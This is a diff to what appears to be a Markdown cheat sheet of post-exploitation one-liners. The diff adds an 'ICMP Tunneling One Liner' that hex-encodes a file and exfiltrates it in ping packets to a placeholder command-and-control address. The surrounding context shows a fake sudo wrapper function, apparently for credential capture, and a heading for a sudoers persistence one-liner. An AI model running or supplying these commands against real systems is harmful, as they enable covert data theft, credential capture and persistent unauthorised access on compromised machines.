@@ -49,6 +49,12 @@ function sudo() {
     $realsudo "${@:1}"
 ```
 
+## ICMP Tunneling One Liner:
+
+```
+xxd -p -c 4 /path/exfil_file | while read line; do ping -c 1 -p $line <C2 IP>; done
+```
+
 ## One Liner to Add Persistence on a Box via Sudoers File:
 
 ```
